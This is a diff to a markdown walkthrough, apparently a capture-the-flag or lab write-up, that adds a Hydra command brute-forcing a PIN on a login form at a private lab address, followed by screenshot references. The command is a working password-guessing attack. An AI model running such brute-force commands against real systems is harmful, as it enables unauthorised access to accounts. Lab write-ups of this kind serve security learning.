@@ -21,8 +21,15 @@
  
 #### Using the Password List
 ![image](5(1).png)
-
+```bash
+hydra -l '' -P 3pass.txt -f -v 10.10.172.65 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
+```
 #### Found Pin:
 ![image](6.png)
+
+
+![image](7.png)
+
+
 
 
